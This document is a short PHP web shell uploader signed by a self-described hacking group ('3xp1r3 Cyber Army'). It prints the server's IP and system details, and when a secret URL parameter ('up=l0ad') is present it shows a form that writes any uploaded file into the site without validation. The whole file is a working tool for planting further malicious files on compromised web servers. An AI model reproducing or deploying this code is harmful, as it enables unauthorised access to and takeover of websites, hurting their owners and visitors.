<?php
/**
Author : Frank WiX
FB: https://fb.com/WiX3CA
3xp1r3 Cyber Army 
**/
error_reporting(0);
echo "Frank Wix <br> Server IP : ";
echo gethostbyname($_SERVER["HTTP_HOST"]);
echo "<br> Uname : ";
echo php_uname();
echo "<br>";
if($_GET['up']=="l0ad"){
if(isset($_POST['Submit'])){
	$filedir = ""; 
	$maxfile = '2000000';
	$mode = '0644';
	$userfile_name = $_FILES['image']['name'];
	$userfile_tmp = $_FILES['image']['tmp_name'];
	if(isset($_FILES['image']['name'])) {
		$qx = $filedir.$userfile_name;
		@move_uploaded_file($userfile_tmp, $qx);
		@chmod ($qx, octdec($mode));
echo" <a href=$userfile_name><center><b> $userfile_name</b></center></a>";
}}
else{
echo'<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
}
echo '</center>';
}
?>
